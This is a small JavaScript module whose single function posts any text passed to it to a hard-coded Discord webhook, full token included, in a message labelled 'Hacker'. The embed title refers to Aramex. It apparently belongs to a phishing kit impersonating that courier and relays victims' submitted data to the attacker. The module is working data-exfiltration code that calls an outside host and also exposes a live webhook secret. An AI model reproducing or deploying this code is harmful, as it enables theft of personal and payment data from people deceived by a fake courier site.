import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1338476183683207248/awXEWj9VRmOUxMWIiF3OzCcnQ_j0vjhwcxEzbMUkX2o2ytgXsymD7wFJAowui91nUMKm",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
